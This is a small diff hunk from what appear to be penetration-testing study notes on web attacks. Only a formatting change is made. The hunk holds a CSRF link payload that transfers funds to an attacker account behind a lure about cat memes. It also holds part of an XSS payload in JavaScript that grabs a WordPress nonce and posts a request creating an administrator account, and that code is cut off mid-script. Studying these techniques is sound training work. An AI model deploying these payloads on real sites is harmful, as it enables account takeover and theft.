@@ -232,7 +232,8 @@
      - privilege escalation: steal cookies. protection (secure-send cookier over https.httpOnly-deny js access to cookies). browser tool 'Storage>Cookies'  
      - CSRF: `<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>`  
      - Create a new WordPress Admin account  
-       - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression `var nonceRegex = /ser" value="([^"]*?)"/g;`    
+       - exploit /wp-admin/user-new.php, retrieve nonce value in HTTP response based on the regular expression  
+         `var nonceRegex = /ser" value="([^"]*?)"/g;`    
          ```
          var params = "action=createuser&_wpnonce_createuser="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
          ajaxRequest = new XMLHttpRequest();
